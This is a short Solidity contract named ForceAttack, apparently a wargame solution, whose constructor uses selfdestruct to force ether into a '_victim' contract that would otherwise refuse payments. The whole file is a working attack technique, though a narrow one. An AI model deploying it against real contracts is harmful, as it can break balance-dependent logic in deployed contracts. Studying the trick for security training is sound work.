// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttack {

    constructor(address payable _victim) public payable {
        selfdestruct(_victim);
    }
}